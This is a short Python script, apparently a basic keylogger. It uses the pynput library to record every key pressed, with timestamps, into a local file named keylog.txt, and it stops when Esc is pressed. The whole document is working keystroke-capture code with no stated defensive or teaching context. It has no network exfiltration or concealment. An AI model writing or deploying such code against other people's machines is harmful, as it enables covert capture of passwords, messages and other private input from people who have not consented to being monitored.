import logging
from pynput import keyboard

# Setting up the log file and format
log_file = "keylog.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Callback function to execute when a key is pressed
def on_press(key):
    try:
        logging.info('Key pressed: {0}'.format(key.char))
    except AttributeError:
        logging.info('Special key pressed: {0}'.format(key))

# Callback function to execute when a key is released
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener on 'Esc' key press
        return False

# Starting the listener for keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
